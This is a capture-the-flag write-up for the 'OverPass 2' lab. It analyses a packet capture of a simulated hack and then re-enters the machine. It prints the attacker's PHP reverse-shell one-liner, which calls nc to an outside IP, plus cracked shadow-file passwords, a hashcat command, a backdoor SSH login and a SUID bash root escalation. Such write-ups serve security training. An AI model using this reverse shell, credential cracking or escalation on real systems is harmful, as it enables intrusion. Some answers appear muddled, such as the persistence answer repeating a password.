# WriteUp for OverPass 2

We have a pcapng file which has sniffed packets of the hack.
Lets analyse the file with wireshark, here we can change the file format to pcap by using editcap.

## What was the URL of the page they used to upload a reverse shell?
We analyse the HTTP requests and find that /development is the folder where the reverse shell is uploaded.

## What payload did the attacker use to gain access?
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

## What password did the attacker use to privesc?
whenevernoteartinstant

## How did the attacker establish persistence?
whenevernoteartinstant

## Using the fasttrack wordlist, how many of the system passwords were crackable?
We find that there is contents of /etc/shadow file in the sniffed packtes, There we have a few hashes which we can decode using john the ripper and we find there are 4 such cracked password.
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
The passwords:-
```
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)

```

Now that you've found the code for the backdoor, it's time to analyse it.

## What's the default hash for the backdoor?
We can clone the git repository and find the hash from there.

## What's the hardcoded salt for the backdoor?
The salt is also present in the git repository.

## What was the hash that the attacker used? - go back to the PCAP for this!
We can read the hash used by attacker from the tcp stream.

## Crack the hash using rockyou and a cracking tool of your choice. What's the password?
for this we need to use hash cat.
```
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force ~/Downloads/rockyou.txt --show
```
the password comes out be november 16

## The attacker defaced the website. What message did they leave as a heading?
After Deploying the machine we find out that the website has a message.

## Using the information you've found previously, hack your way back in!

## What's the user flag?
Just running nmap shows post 2222 is open and thats where we have backdoor in the machine, so using ssh we login into the machine
```
 ssh -p 2222 james@10.10.100.158
````
the password is november 16
 and find the user.txt file in /james directory. 
## What's the root flag?
ls -a in james directory shows us a ```/.suid_bash``` file running and using ```./.suid_bash``` -p we can login as root.
